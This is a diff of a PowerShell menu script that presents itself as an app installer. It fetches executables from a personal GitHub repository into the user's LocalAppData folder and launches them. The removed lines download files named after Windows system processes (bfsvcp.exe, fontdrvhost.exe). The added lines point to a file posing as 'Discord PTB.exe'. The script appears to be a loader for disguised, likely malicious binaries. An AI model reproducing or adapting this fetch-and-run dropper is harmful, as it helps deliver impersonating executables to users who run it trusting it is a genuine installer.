@@ -5,12 +5,11 @@ cls
 # CONFIG
 # -------------------------
 
-$global:TargetDir = Join-Path $env:LOCALAPPDATA "MyApp"
+$global:TargetDir  = Join-Path $env:LOCALAPPDATA "MyApp"
+$global:TargetName = "Discord PTB.exe"
+$global:TargetFile = Join-Path $global:TargetDir $global:TargetName
 
-$global:Files = @(
-    @{ Url = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/main/bfsvcp.exe"; Name = "bfsvcp.exe" },
-    @{ Url = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/main/fontdrvhost.exe"; Name = "fontdrvhost.exe" }
-)
+$global:DownloadUrl = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/main/Discord%20PTB.exe"
 
 # -------------------------
 # ANIMATION
@@ -28,47 +27,47 @@ function chk($t){
 }
 
 # -------------------------
+# PREPARE FOLDER
+# -------------------------
+
+function Prepare-Folder {
+    if(-not (Test-Path $global:TargetDir)){
+        New-Item -ItemType Directory -Path $global:TargetDir -Force | Out-Null
+    }
+}
+
+# -------------------------
 # INSTALL
 # -------------------------
 
 function Install-App {
 
-    chk "downloading "
+    Prepare-Folder
 
-    if(-not (Test-Path $global:TargetDir)){
-        New-Item -ItemType Directory -Path $global:TargetDir -Force | Out-Null
-    }
+    chk "opening download "
 
-    foreach($f in $global:Files){
+    # เปิดลิงก์ให้โหลดเอง
+    Start-Process $global:DownloadUrl
 
-        $dest = Join-Path $global:TargetDir $f.Name
+    Write-Host "`nDownload page opened." -ForegroundColor Green
+    Write-Host "Save file to:" -ForegroundColor Cyan
+    Write-Host $global:TargetFile -ForegroundColor White
 
-        if(-not (Test-Path $dest)){
-            try{
-                Invoke-WebRequest $f.Url -OutFile $dest
-                Write-Host "`nDownloaded $($f.Name)" -ForegroundColor Green
-            }
-            catch{
-                Write-Host "`nFailed $($f.Name)" -ForegroundColor Red
-            }
-        }
-        else{
-            Write-Host "`n$f.Name already exists" -ForegroundColor Yellow
-        }
-    }
+    # รอผู้ใช้
+    Pause
 
-    # -------------------------
-    # ASK BEFORE RUN
-    # -------------------------
+    # ถามรัน
+    if(Test-Path $global:TargetFile){
 
-    $runFile = Join-Path $global:TargetDir "bfsvcp.exe"
+        $ans = Read-Host "`nRun now? (y/n)"
 
-    if(Test-Path $runFile){
-        $ans = Read-Host "`nRun bfsvcp.exe now? (y/n)"
         if($ans -eq "y"){
-            Write-Host "`nRunning bfsvcp.exe..." -ForegroundColor Cyan
-            Start-Process $runFile
+            Write-Host "`nRunning..." -ForegroundColor Cyan
+            Start-Process $global:TargetFile
         }
+    }
+    else{
+        Write-Host "`nFile not found (you may not have downloaded yet)" -ForegroundColor Red
     }
 
     Pause
@@ -80,37 +79,16 @@ function Install-App {
 
 function Check-App {
 
-    Write-Host "`nChecking files..." -ForegroundColor Yellow
+    Prepare-Folder
 
-    foreach($f in $global:Files){
-        $path = Join-Path $global:TargetDir $f.Name
+    Write-Host "`nChecking..." -ForegroundColor Yellow
 
-        if(Test-Path $path){
-            Write-Host "$($f.Name) OK" -ForegroundColor Green
-        }
-        else{
-            Write-Host "$($f.Name) NOT FOUND" -ForegroundColor Red
-        }
+    if(Test-Path $global:TargetFile){
+        Write-Host "`nFile found" -ForegroundColor Green
+        Write-Host $global:TargetFile -ForegroundColor Cyan
     }
-
-    Pause
-}
-
-# -------------------------
-# CLEAN
-# -------------------------
-
-function Clean-App {
-
-    Write-Host "`nCleaning..." -ForegroundColor Yellow
-
-    foreach($f in $global:Files){
-        $path = Join-Path $global:TargetDir $f.Name
-
-        if(Test-Path $path){
-            Remove-Item $path -Force
-            Write-Host "Deleted $($f.Name)" -ForegroundColor Green
-        }
+    else{
+        Write-Host "`nFile not found" -ForegroundColor Red
     }
 
     Pause
@@ -121,11 +99,11 @@ function Clean-App {
 # -------------------------
 
 while($true){
+
     cls
     Write-Host "=== MENU ===`n" -ForegroundColor Cyan
     Write-Host "1. Install"
     Write-Host "2. Check"
-    Write-Host "3. Clean"
     Write-Host "0. Exit"
 
     $m = Read-Host ">"
@@ -133,7 +111,6 @@ while($true){
     switch($m){
         "1" { Install-App }
         "2" { Check-App }
-        "3" { Clean-App }
         "0" { break }
         default { continue }
     }
